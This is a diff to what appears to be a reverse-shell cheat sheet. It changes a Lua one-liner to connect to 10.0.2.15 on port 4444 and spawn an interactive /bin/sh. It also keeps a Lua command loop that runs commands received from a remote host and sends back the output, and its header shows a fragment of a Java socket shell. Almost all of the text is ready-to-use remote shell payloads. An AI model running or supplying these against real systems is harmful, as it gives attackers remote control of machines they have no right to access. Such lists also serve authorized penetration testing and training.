@@ -165,7 +165,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ╚═══════════════════════════════════════════════════
 
 ╔LUA═════════╦══════════════════════════════════════
-║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+║ Linux only ║ lua -e "require('os');t=require('socket').tcp():connect('10.0.2.15','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ╠════════════╩══════╦═══════════════════════════════
 ║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ╚═══════════════════╩═══════════════════════════════
